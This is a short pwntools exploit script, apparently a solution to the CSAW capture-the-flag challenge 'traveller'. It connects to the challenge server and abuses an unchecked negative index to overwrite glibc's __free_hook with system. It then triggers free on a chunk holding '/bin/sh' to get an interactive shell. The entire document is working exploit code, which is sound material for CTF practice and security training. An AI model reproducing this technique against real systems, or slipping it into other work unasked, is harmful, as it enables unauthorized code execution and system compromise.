#!/usr/bin/env python2
from pwn import *
context(arch="amd64",os="linux",timeout=0.5)
e = ELF('./traveller')
#p = process('./traveller')
p = remote('pwn.chal.csaw.io',1003)

p.recvuntil('> ')
p.sendline('1') #create
p.recvuntil('> ')
p.sendline('1') # malloc(0x80)
p.recvuntil('Destination: ')
p.sendline('/bin/sh')

p.recvuntil('> ')
p.sendline('2')
p.recvuntil(': ')
p.sendline('-262194') # __free_hook
p.sendline(p64(e.symbols['system'])) #overwriting free hook with system

p.recvuntil('>')
p.sendline('3')
p.recvuntil(': ')
p.sendline('0') # trigerring __free_hook by calling free
p.interactive()
